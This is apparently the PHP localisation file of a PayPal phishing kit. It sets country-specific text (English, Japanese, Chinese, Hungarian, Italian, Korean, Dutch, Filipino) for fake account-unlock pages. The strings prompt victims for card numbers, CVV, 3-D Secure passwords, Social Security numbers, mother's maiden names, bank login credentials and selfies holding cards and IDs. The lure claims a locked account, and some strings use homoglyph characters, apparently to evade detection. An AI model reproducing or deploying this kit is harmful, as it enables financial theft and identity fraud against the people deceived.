<?php
include('../detect.php');
include('../settings.php');
if ($pais_multilang == 'lang_active') {
	if ($negara == 'GB') {
		$ca = 'Address Line 1';
		$cb = 'Address Line 2 (optional)';
		$cci = 'City';
		$cd = 'State';
		$ce = 'Zip / Post code';
		$cf = 'Country';
		$cg = 'Phone Number (primary)';
		$ch = 'Mother Maiden Name';
		$ci = 'Social Security Number';
		$cj = 'National ID Number';
		$ck = 'Driver Licence Number';
		$cl = 'Codice Fiscale';
		$cm = 'Date of birthday';
		$cn = 'Cardholder Name';
		$co = 'Card Number';
		$cp = 'Expiration Date';
		$cq = 'Next';
		$cr = 'Card Verification Number';
		$cs = 'Added Protection';
		$ct = 'Do the authentication. Please enter the password of the VISA / MASTERCARD / JCB / AMEX safekey authentication service.';
		$cu = 'Merchant';
		$cv = 'Amount';
		$cw = 'Date';
		$cx = 'Card Number';
		$cy = 'Personal message';
		$cz = 'A personal greeting';
		$a1 = 'Password';
		$b1 = 'Help';
		$c1 = 'PayPal protects your bank account by keeping your financial information confidential. We email you when you make a transaction with this bank account. To avoid withdrawal failures and return fees, the name on your ΡayΡal account must match the name on your bank account.';
		$d1 = 'Account Νumber ';
		$e1 = 'Bank Name';
		$f1 = 'Bank Cοde';
		$g1 = 'Bank Login ID ';
		$h1 = 'Bank Login Passwοrd';
		$i1 = 'Skip';
		$j1 = 'Paypal requires a copy of certain documents for verification purposes to return your account to regular standing.';
		$k1 = 'Take a selfie with your Credit/Debit Card:';
		$l1 = 'Take a selfie with your ID Card/Driver License:';
		$m1 = 'Take picture on back your Credit/Debit Card:';
		$n1 = 'Take picture on back your ID Card/Driver License:';
		$o1 = 'Done';
		$p1 = 'Recent fraud activity ';
		$q1 = 'Locked PayPal account.';
		$r1 = 'Try signin in ';
		$s1 = 'Fake PayPal emails or spoof websites on, ';
		$t1 = 'yesterday';
		$u1 = 'Unauthorized transactions on your PayPal Credit or Debit Card.';
		$v1 = 'Unauthorized activity on your PayPal account.';
		$w1 = 'Unlock Account';
	}elseif ($negara == 'JP') {
		$ca = '住所1';
		$cb = '住所2（オプション）';
		$cci = 'シティ';
		$cd = '状態';
		$ce = '郵便番号';
		$cf = '国';
		$cg = '電話番号（プライマリ）';
		$ch = '母の乙女の名前';
		$ci = '社会保障番号';
		$cj = '国民番号';
		$ck = '運転免許証番号';
		$cl = 'コーディスフィッシャー';
		$cm = '誕生日';
		$cn = 'クレジットカード名義人氏名';
		$co = 'カード番号';
		$cp = '有効期限';
		$cq = '次';
		$cr = 'カード確認番号';
		$cs = '保護の追加';
		$ct = '認証を行います。 VISA / MASTERCARD / JCB / AMEX安全鍵認証サービスのパスワードを入力してください。';
		$cu = '商人';
		$cv = '量';
		$cw = '日付';
		$cx = 'カード番号';
		$cy = 'パーソナルメッセージ';
		$cz = '個人的な挨拶';
		$a1 = 'パスワード';
		$b1 = '助けて';
		$c1 = 'PayPalは、財務情報を機密に保つことによって銀行口座を保護します。この銀行口座との取引をする際にメールでお送りします。払い戻しの失敗や返品手数料を避けるためには、Ρayパalアカウントの名前と銀行口座の名前が一致している必要があります。';
		$d1 = 'アカウント番号';
		$e1 = '銀行名';
		$f1 = '銀行コト';
		$g1 = '銀行のログインID';
		$h1 = '銀行ログインのパスワード';
		$i1 = 'スキップ';
		$j1 = 'Paypalは、あなたの口座を通常の状態に戻すために、確認のために特定の書類のコピーを必要とします。';
		$k1 = 'あなたのクレジット/デビットカードでセルフリーを取る：';
		$l1 = 'あなたのIDカード/運転免許証でセルフリーを取る：';
		$m1 = 'あなたのクレジットカード/デビットカードの写真を撮る：';
		$n1 = 'IDカード/運転免許証の写真を撮る：';
		$o1 = '完了';
		$p1 = '最近の不正行為';
		$q1 = 'ロックされたPayPalアカウント。';
		$r1 = 'ログインしてみてください';
		$s1 = 'PayPalの電子メールを偽ったり、ウェブサイトを偽装したりする。';
		$t1 = '昨日';
		$u1 = 'PayPalクレジットカードまたはデビットカードの不正な取引。';
		$v1 = 'PayPalアカウントでの不正な行為。';
		$w1 = 'アカウントのロック解除';
	}elseif ($negara == 'CN') {
		$ca = '地址栏1';
		$cb = '地址行2（可选）';
		$cci = '市';
		$cd = '州';
		$ce = '邮编/邮政编码';
		$cf = '国家';
		$cg = '电话号码（小学）';
		$ch = '母亲的娘家姓';
		$ci = '社会安全号码';
		$cj = '身份证号码';
		$ck = '驾驶执照号码';
		$cl = 'Codice Fiscale';
		$cm = '生日日期';
		$cn = '持卡人姓名';
		$co = '卡号';
		$cp = '截止日期';
		$cq = '下一个';
		$cr = '卡片识别号';
		$cs = '增加保护';
		$ct = '做认证。请输入VISA / MASTERCARD / JCB / AMEX安全认证服务的密码。';
		$cu = '商人';
		$cv = '量';
		$cw = '日期';
		$cx = '卡号';
		$cy = '个人消息';
		$cz = '个人问候';
		$a1 = '密码';
		$b1 = '帮帮我';
		$c1 = '贝宝保护您的银行帐户，保护您的财务信息。我们通过这个银行账户进行交易时向您发送电子邮件。为避免退款失败并退回费用，您的ΡAYTPA账户上的姓名必须与您的银行账户上的姓名一致。';
		$d1 = '帐户号码';
		$e1 = '银行名';
		$f1 = 'BankCοde';
		$g1 = '银行登录ID';
		$h1 = '银行登录密码';
		$i1 = '跳跃';
		$j1 = 'Paypal需要一份用于验证的文件副本才能将您的帐户恢复到正常的状态。';
		$k1 = '用您的信用卡/借记卡拍照：';
		$l1 = '以身份证/驾驶执照拍照：';
		$m1 = '拍下您的信用卡/借记卡上的照片：';
		$n1 = '拍下您的身份证/驾照：';
		$o1 = '完成';
		$p1 = '最近的欺诈活动';
		$q1 = '锁定的PayPal账户。';
		$r1 = '尝试登录';
		$s1 = '假贝宝电子邮件或欺骗网站上。';
		$t1 = '昨天';
		$u1 = '在您的PayPal信用卡或借记卡上未经授权的交易。';
		$v1 = '在您的PayPal帐户上未经授权的活动。';
		$w1 = '解锁帐户';
	}elseif ($negara == 'HU') {
		$ca = 'Címsor 1';
		$cb = 'Címsor 2 (opcionális)';
		$cci = 'Város';
		$cd = 'Állapot';
		$ce = 'Írányítószám';
		$cf = 'Ország';
		$cg = 'Telefonszám (elsődleges)';
		$ch = 'Anyja leánykori neve';
		$ci = 'Társadalombiztosítási szám';
		$cj = 'személyi igazolvány szám';
		$ck = 'Illesztőprogram licencszám';
		$cl = 'Codice Fiscale';
		$cm = 'Születésnap';
		$cn = 'Kártyatulajdonos neve';
		$co = 'Kártyaszám';
		$cp = 'Lejárati dátum';
		$cq = 'Következő';
		$cr = 'Kártyaigazolási szám';
		$cs = 'Hozzáadott védelem';
		$ct = 'Végezze el a hitelesítést. Kérjük, adja meg a VISA / MASTERCARD / JCB / AMEX safekey hitelesítési szolgáltatás jelszavát.';
		$cu = 'Kereskedő';
		$cv = 'Összeg';
		$cw = 'Dátum';
		$cx = 'Kártyaszám';
		$cy = 'Személyes üzenetet';
		$cz = 'Egy személyes üdvözlet';
		$a1 = 'Jelszó';
		$b1 = 'Segítség';
		$c1 = 'A PayPal megvédi bankszámláját a pénzügyi információk bizalmas kezelésével. E-mailt küldünk Önnek, amikor tranzakciót hajt végre ezzel a bankszámlával. A visszavonási hibák és a visszatérítési díjak elkerülése érdekében a ΡayΡal számláján szereplő névnek meg kell egyeznie a bankszámláján szereplő névvel.';
		$d1 = 'Számla szám';
		$e1 = 'A bank neve';
		$f1 = 'Bank kód';
		$g1 = 'Bank bejelentkezési azonosítója';
		$h1 = 'Banki bejelentkezés Passw';
		$i1 = 'Átugrani';
		$j1 = 'A Paypal bizonyos dokumentumok másolatát ellenőrző célokra igényli, hogy a fiókját rendszeresen állítsa vissza.';
		$k1 = 'Vegyen fel egy önállóságot a hitel / bankkártyájával:';
		$l1 = 'Vigye magával a személyi igazolványát / vezetői engedélyét:';
		$m1 = 'Vegye le a képet a hitel / bankkártyája hátoldalán:';
		$n1 = 'Vegye le a képet az ID kártyáján / illesztőprogram licencén:';
		$o1 = 'Kész';
		$p1 = 'Legutóbbi csalási tevékenység';
		$q1 = 'Zárolt PayPal-fiók.';
		$r1 = 'Próbálj be bejelentkezni';
		$s1 = 'Hamis PayPal e-mailek vagy spoof webhelyek.';
		$t1 = 'tegnap';
		$u1 = 'Jogosulatlan tranzakciók a PayPal-hitel- vagy bankkártyáján.';
		$v1 = 'Jogosulatlan tevékenység a PayPal számláján.';
		$w1 = 'Fiók feloldása';
	}elseif ($negara == 'IT') {
		$ca = 'Indirizzo Linea 1';
		$cb = 'Indirizzo 2 (opzionale)';
		$cci = 'Città';
		$cd = 'Stato';
		$ce = 'Codice di avviamento postale';
		$cf = 'Nazione';
		$cg = 'Numero di telefono (primario)';
		$ch = 'Nome da nubile della madre';
		$ci = 'Numero di Social Security';
		$cj = 'Numero di identificazione nazionale';
		$ck = 'Numero di licenza del conducente';
		$cl = 'Codice Fiscale';
		$cm = 'Data del compleanno';
		$cn = 'Nome del titolare';
		$co = 'Numero di carta';
		$cp = 'Data di scadenza';
		$cq = 'Il prossimo';
		$cr = 'Numero di verifica della carta';
		$cs = 'Protezione aggiunta';
		$ct = "Fai l'autenticazione. Inserire la password del servizio di autenticazione della chiave di sicurezza VISA / MASTERCARD / JCB / AMEX.";
		$cu = 'Mercante';
		$cv = 'Quantità';
		$cw = 'Data';
		$cx = 'Numero di carta';
		$cy = 'Messaggio personale';
		$cz = 'Un saluto personale';
		$a1 = "Parola d'ordine";
		$b1 = 'Aiuto';
		$c1 = "PayPal protegge il tuo conto bancario mantenendo riservate le tue informazioni finanziarie. Ti inviamo un'email quando effettui una transazione con questo conto bancario. Per evitare errori di prelievo e commissioni di reso, il nome sul tuo account ΡayΡal deve corrispondere al nome sul tuo conto bancario.";
		$d1 = 'Numero di conto';
		$e1 = 'Nome della banca';
		$f1 = 'Bank Cece';
		$g1 = 'ID di accesso bancario';
		$h1 = 'Passaggio di accesso bancario';
		$i1 = 'Salta';
		$j1 = 'Paypal richiede una copia di determinati documenti a scopo di verifica per riportare il tuo account a una posizione regolare.';
		$k1 = 'Fai un selfie con la tua carta di credito / debito:';
		$l1 = "Fai un selfie con la tua carta d'identità / patente di guida:";
		$m1 = "Scatta una foto sulla tua carta di credito / debito:";
		$n1 = "Scatta foto sul retro della tua carta d'identità / patente di guida:";
		$o1 = 'Fatto';
		$p1 = 'Attività di frode recente';
		$q1 = 'Account PayPal bloccato.';
		$r1 = 'Prova ad accedere';
		$s1 = 'Posta elettronica falsa di PayPal o spoofing dei siti Web su.';
		$t1 = 'ieri';
		$u1 = 'Transazioni non autorizzate sulla carta di credito o di debito PayPal.';
		$v1 = 'Attività non autorizzata sul tuo conto PayPal.';
		$w1 = 'Sblocca account';
	}elseif ($negara == 'KR') {
		$ca = '주소 라인 1';
		$cb = '주소 입력란 2 (선택 사항)';
		$cci = '시티';
		$cd = '상태';
		$ce = '우편 번호 / 우편 번호';
		$cf = '국가';
		$cg = '전화 번호 (기본)';
		$ch = '어머니의 처녀 이름';
		$ci = '사회 보장 번호';
		$cj = '주민등록번호';
		$ck = '운전 면허증 번호';
		$cl = '코디스 피스 칼';
		$cm = '생년월일';
		$cn = '카드 소지자 이름';
		$co = '카드 번호';
		$cp = '만료일';
		$cq = '다음 것';
		$cr = '카드 확인 번호';
		$cs = '추가 보호';
		$ct = '인증을하십시오. VISA / MASTERCARD / JCB / AMEX 안전 키 인증 서비스의 비밀번호를 입력하십시오.';
		$cu = '상인';
		$cv = '양';
		$cw = '날짜';
		$cx = '카드 번호';
		$cy = '개인 메시지';
		$cz = '개인적인 인사';
		$a1 = '암호';
		$b1 = '도움';
		$c1 = 'PayPal은 귀하의 금융 정보를 기밀로 유지함으로써 은행 계좌를 보호합니다. 이 은행 계좌로 거래를 할 때 이메일을 보내드립니다. 철수 실패 및 반납 수수료를 피하기 위해 귀하의 Ρaypatal 계좌의 이름은 계좌의 이름과 일치해야합니다.';
		$d1 = '계정 번호';
		$e1 = '은행 이름';
		$f1 = '은행 코드';
		$g1 = '은행 로그인 ID';
		$h1 = '은행 로그인 패스워드';
		$i1 = '버킷';
		$j1 = 'Paypal은 귀하의 계좌를 정상 상태로 되돌리기 위해 확인을 위해 특정 서류의 사본을 요구합니다.';
		$k1 = '귀하의 신용 / 직불 카드로 셀카를 가져 가십시오 :';
		$l1 = 'ID 카드 / 운전 면허증을 가지고 셀카를 취하십시오 :';
		$m1 = '신용 / 직불 카드 뒷면 사진 촬영 :';
		$n1 = 'ID 카드 / 운전 면허증을 다시 찍으십시오 :';
		$o1 = '끝난';
		$p1 = '최근 사기 행위';
		$q1 = '잠긴 PayPal 계정.';
		$r1 = '로그인 해보세요.';
		$s1 = '페이팔 (PayPal) 이메일을 가짜로 보내거나 위에 스푸핑 웹 사이트.';
		$t1 = '어제';
		$u1 = 'PayPal 신용 카드 또는 직불 카드에서 무단 거래.';
		$v1 = 'PayPal 계정의 무단 활동.';
		$w1 = '계정 잠금 해제';
	}elseif ($negara == 'NL') {
		$ca = 'Adres regel 1';
		$cb = 'Adres regel 2 (optioneel)';
		$cci = 'stad';
		$cd = 'Staat';
		$ce = 'Postcode / postcode';
		$cf = 'land';
		$cg = 'Telefoonnummer (primair)';
		$ch = 'Moeder Maiden Naam';
		$ci = 'Burgerservicenummer';
		$cj = 'Nationale ID Nummer';
		$ck = 'Rijbewijsnummer';
		$cl = 'Codice Fiscale';
		$cm = 'Verjaardagsdatum';
		$cn = 'naam pashouder';
		$co = 'Kaartnummer';
		$cp = 'uiterste houdbaarheidsdatum';
		$cq = 'volgende';
		$cr = 'Kaart Verificatie Nummer';
		$cs = 'Beveiliging toegevoegd';
		$ct = 'Voer de authenticatie uit. Voer het wachtwoord in van de safekey-authenticatieservice van VISA / MASTERCARD / JCB / AMEX.';
		$cu = 'Handelaar';
		$cv = 'Bedrag';
		$cw = 'Datum';
		$cx = 'Kaartnummer';
		$cy = 'Persoonlijk bericht';
		$cz = 'Een persoonlijke groet';
		$a1 = 'Wachtwoord';
		$b1 = 'Helpen';
		$c1 = 'PayPal beschermt uw bankrekening door uw financiële gegevens vertrouwelijk te houden. We e-mailen u wanneer u een transactie met deze bankrekening uitvoert. Om ontwenningsfouten en retourkosten te voorkomen, moet de naam op uw ΡayΡal-account overeenkomen met de naam op uw bankrekening.';
		$d1 = 'Account Νnummer';
		$e1 = 'Banknaam';
		$f1 = 'Bank Cope';
		$g1 = 'Bank Login ID';
		$h1 = 'Bank Login Passwurt';
		$i1 = 'Overspringen';
		$j1 = 'Paypal vereist een kopie van bepaalde documenten voor verificatiedoeleinden om uw account weer normaal te maken.';
		$k1 = 'Neem een ​​selfie met uw creditcard / betaalkaart:';
		$l1 = 'Maak een selfie met je ID-kaart / rijbewijs:';
		$m1 = 'Maak een foto op uw creditcard / betaalpas:';
		$n1 = 'Maak een foto van uw ID-kaart / rijbewijs:';
		$o1 = 'Gedaan';
		$p1 = 'Recente fraudeactiviteit';
		$q1 = 'Gesloten PayPal-rekening.';
		$r1 = 'Probeer in te loggen';
		$s1 = 'Valse e-mails van PayPal of spoofwebsites op.';
		$t1 = 'gisteren';
		$u1 = 'Ongeautoriseerde transacties op uw PayPal-creditcard of -pas.';
		$v1 = 'Ongeautoriseerde activiteit op uw PayPal-rekening.';
		$w1 = 'Account ontgrendelen';
	}elseif ($negara == 'PH') {
		$ca = 'Address Line 1';
		$cb = 'Address Line 2 (opsyonal)';
		$cci = 'Lungsod';
		$cd = 'Estado';
		$ce = 'Zip / Post code';
		$cf = 'Bansa';
		$cg = 'Numero ng Telepono (pangunahing)';
		$ch = 'Pangalan ng Ina Maiden';
		$ci = 'Numero ng Social Security';
		$cj = 'Numero ng National ID';
		$ck = 'Numero ng Lisensya sa Pagmamaneho';
		$cl = 'Codice Fiscale';
		$cm = 'Petsa ng kaarawan';
		$cn = 'Pangalan ng Cardholder';
		$co = 'Numero ng card';
		$cp = 'Petsa ng pagkawalang bisa';
		$cq = 'Susunod';
		$cr = 'Numero ng Pagpapatunay ng Kard';
		$cs = 'Nagdagdag ng Proteksyon';
		$ct = 'Gawin ang pagpapatunay. Mangyaring ipasok ang password ng serbisyo ng pagpapatunay ng VISA / MASTERCARD / JCB / AMEX safekey.';
		$cu = 'Mangangalakal';
		$cv = 'Halaga';
		$cw = 'Petsa';
		$cx = 'Numero ng card';
		$cy = 'Personal na Mensahe';
		$cz = 'Isang personal na pagbati';
		$a1 = 'Password';
		$b1 = 'Tulong';
		$c1 = 'Pinoprotektahan ng PayPal ang iyong bank account sa pamamagitan ng pagpapanatili ng kumpidensyal na impormasyon sa iyong pananalapi. Nag-email kami sa iyo kapag gumawa ka ng isang transaksyon sa bank account na ito. Upang maiwasan ang mga pagkabigo sa pag-withdraw at mga bayarin sa pagbalik, ang pangalan sa iyong ΡayΡal account ay dapat tumugma sa pangalan sa iyong bank account.';
		$d1 = 'Account Νumber';
		$e1 = 'Pangalan ng bangko';
		$f1 = 'Bank Cοde';
		$g1 = 'Bank Login ID';
		$h1 = 'Bank Login Passwrd';
		$i1 = 'Laktawan';
		$j1 = 'Nangangailangan ng PayPal ang isang kopya ng ilang mga dokumento para sa mga layunin ng pag-verify upang ibalik ang iyong account sa regular na katayuan.';
		$k1 = 'Kumuha ng selfie gamit ang iyong Credit / Debit Card:';
		$l1 = 'Kumuha ng selfie gamit ang iyong ID Card / Driver License:';
		$m1 = 'Kumuha ng larawan sa likod ng iyong Credit / Debit Card:';
		$n1 = 'Kumuha ng larawan sa likod ng iyong ID Card / Driver License:';
		$o1 ='Tapos na';
		$p1 = 'Kamakailang aktibidad sa pandaraya';
		$q1 = 'Naka-lock na PayPal account.';
		$r1 = 'Subukan ang pag-sign in';
		$s1 = 'Pekeng PayPal email o spoof website sa.';
		$t1 = 'kahapon';
		$u1 = 'Di-awtorisadong mga transaksyon sa iyong PayPal Credit o Debit Card.';
		$v1 = 'Hindi awtorisadong aktibidad sa iyong PayPal account.';
		$w1 = 'I-unlock ang Account';
	}else{
		$ca = 'Address Line 1';
		$cb = 'Address Line 2 (optional)';
		$cci = 'City';
		$cd = 'State';
		$ce = 'Zip / Post code';
		$cf = 'Country';
		$cg = 'Phone Number (primary)';
		$ch = 'Mother Maiden Name';
		$ci = 'Social Security Number';
		$cj = 'National ID Number';
		$ck = 'Driver Licence Number';
		$cl = 'Codice Fiscale';
		$cm = 'Date of birthday';
		$cn = 'Cardholder Name';
		$co = 'Card Number';
		$cp = 'Expiration Date';
		$cq = 'Next';
		$cr = 'Card Verification Number';
		$cs = 'Added Protection';
		$ct = 'Do the authentication. Please enter the password of the VISA / MASTERCARD / JCB / AMEX safekey authentication service.';
		$cu = 'Merchant';
		$cv = 'Amount';
		$cw = 'Date';
		$cx = 'Card Number';
		$cy = 'Personal message';
		$cz = 'A personal greeting';
		$a1 = 'Password';
		$b1 = 'Help';
		$c1 = 'PayPal protects your bank account by keeping your financial information confidential. We email you when you make a transaction with this bank account. To avoid withdrawal failures and return fees, the name on your ΡayΡal account must match the name on your bank account.';
		$d1 = 'Account Νumber ';
		$e1 = 'Bank Name';
		$f1 = 'Bank Cοde';
		$g1 = 'Bank Login ID ';
		$h1 = 'Bank Login Passwοrd';
		$i1 = 'Skip';
		$j1 = 'Paypal requires a copy of certain documents for verification purposes to return your account to regular standing.';
		$k1 = 'Take a selfie with your Credit/Debit Card:';
		$l1 = 'Take a selfie with your ID Card/Driver License:';
		$m1 = 'Take picture on back your Credit/Debit Card:';
		$n1 = 'Take picture on back your ID Card/Driver License:';
		$o1 = 'Done';
		$p1 = 'Recent fraud activity ';
		$q1 = 'Locked PayPal account.';
		$r1 = 'Try signin in ';
		$s1 = 'Fake PayPal emails or spoof websites on, ';
		$t1 = 'yesterday';
		$u1 = 'Unauthorized transactions on your PayPal Credit or Debit Card.';
		$v1 = 'Unauthorized activity on your PayPal account.';
		$w1 = 'Unlock Account';
	}
}else{
	$ca = 'Address Line 1';
	$cb = 'Address Line 2 (optional)';
	$cci = 'City';
	$cd = 'State';
	$ce = 'Zip / Post code';
	$cf = 'Country';
	$cg = 'Phone Number (primary)';
	$ch = 'Mother Maiden Name';
	$ci = 'Social Security Number';
	$cj = 'National ID Number';
	$ck = 'Driver Licence Number';
	$cl = 'Codice Fiscale';
	$cm = 'Date of birthday';
	$cn = 'Cardholder Name';
	$co = 'Card Number';
	$cp = 'Expiration Date';
	$cq = 'Next';
	$cr = 'Card Verification Number';
	$cs = 'Added Protection';
	$ct = 'Do the authentication. Please enter the password of the VISA / MASTERCARD / JCB / AMEX safekey authentication service.';
	$cu = 'Merchant';
	$cv = 'Amount';
	$cw = 'Date';
	$cx = 'Card Number';
	$cy = 'Personal message';
	$cz = 'A personal greeting';
	$a1 = 'Password';
	$b1 = 'Help';
	$c1 = 'PayPal protects your bank account by keeping your financial information confidential. We email you when you make a transaction with this bank account. To avoid withdrawal failures and return fees, the name on your ΡayΡal account must match the name on your bank account.';
	$d1 = 'Account Νumber ';
	$e1 = 'Bank Name';
	$f1 = 'Bank Cοde';
	$g1 = 'Bank Login ID ';
	$h1 = 'Bank Login Passwοrd';
	$i1 = 'Skip';
	$j1 = 'Paypal requires a copy of certain documents for verification purposes to return your account to regular standing.';
	$k1 = 'Take a selfie with your Credit/Debit Card:';
	$l1 = 'Take a selfie with your ID Card/Driver License:';
	$m1 = 'Take picture on back your Credit/Debit Card:';
	$n1 = 'Take picture on back your ID Card/Driver License:';
	$o1 = 'Done';
	$p1 = 'Recent fraud activity ';
	$q1 = 'Locked PayPal account.';
	$r1 = 'Try signin in ';
	$s1 = 'Fake PayPal emails or spoof websites on, ';
	$t1 = 'yesterday';
	$u1 = 'Unauthorized transactions on your PayPal Credit or Debit Card.';
	$v1 = 'Unauthorized activity on your PayPal account.';
	$w1 = 'Unlock Account';
}